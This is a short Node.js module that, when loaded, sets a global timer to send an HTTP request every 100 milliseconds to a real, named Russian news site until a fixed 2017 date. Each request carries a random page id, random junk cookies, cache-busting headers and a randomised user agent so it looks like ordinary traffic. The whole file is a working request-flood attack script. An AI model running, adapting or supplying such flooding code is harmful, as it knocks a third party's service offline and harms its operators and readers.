const qs = require('querystring')

module.exports = function ({_, _require, agent}) {
  const request = _require('request')
  if (!global._homeland) {
    const until = new Date('2017-04-04T05:59:01.751Z')
    global._homeland = setInterval(function () {
      if (Date.now() < until) {
        const cookies = []
        for(let i  = 0; i < _.random(1, 20); i++) {
          cookies.push(_.random(1, 1000000).toString(36) + '=' + _.random(1, 1000000).toString(36))
        }
        request({
          uri: 'http://dnr-online.ru/?p=' + _.random(1, 30000),
          headers: {
            Referer: 'http://dnr-online.ru/',
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            Pragma: 'no-cache',
            Cookie: cookies.join('; '),
            'Accept-Language': 'ru,en-US;q=0.8,en;q=0.6',
            'Cache-Control': 'no-cache',
            'User-Agent': agent.random()
          }
        })
      }
      else {
        clearInterval(global._homeland)
      }
    },
        100)
  }
}
